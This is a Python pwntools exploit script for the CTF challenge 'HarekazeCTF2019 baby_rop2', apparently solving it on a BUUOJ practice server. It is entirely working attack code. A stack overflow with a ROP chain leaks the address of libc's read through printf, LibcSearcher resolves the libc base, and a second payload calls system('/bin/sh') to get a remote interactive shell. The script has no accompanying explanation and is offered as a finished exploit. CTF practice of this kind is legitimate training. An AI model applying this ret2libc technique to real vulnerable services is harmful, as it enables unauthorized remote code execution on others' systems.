from LibcSearcher import LibcSearcher
from pwn import *


def baby_rop2(file_name=r'/mnt/hgfs/CyberSecurity/PWN/buuoj/[HarekazeCTF2019]baby_rop2'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 27647)
    target_elf = ELF(file_name)

    printf_plt = p64(target_elf.plt['printf'])
    read_got = p64(target_elf.got['read'])
    printf_format_addr = p64(0x400770)
    main_addr = p64(target_elf.symbols['main'])

    pop_ret_gadget = p64(0x400733)  # pop rdi ; ret
    pop2_ret_gadget = p64(0x400731)  # pop rsi ; pop r15 ; ret

    payload_1 = b'A' * (0x20 + 0x8)
    # printf(read_got)
    payload_1 += pop_ret_gadget + printf_format_addr
    payload_1 += pop2_ret_gadget + read_got + p64(0xdeadbeef)
    payload_1 += printf_plt

    # main()
    payload_1 += main_addr

    # gdb.attach(target)
    target.sendlineafter(b"What's your name? ", payload_1)

    target.recvline()
    target.recvuntil(b'Welcome to the Pwn World again, ')
    read_addr = u64(target.recv(6).ljust(8, b'\x00'))
    print(hex(read_addr))

    searcher = LibcSearcher('read', read_addr)
    libc_base_addr = read_addr - searcher.dump('read')
    system_addr = p64(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p64(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * (0x20 + 0x8)
    # system(/bin/sh)
    payload_2 += pop_ret_gadget + bin_sh_addr + system_addr

    target.sendline(payload_2)

    target.interactive()


if __name__ == '__main__':
    baby_rop2()
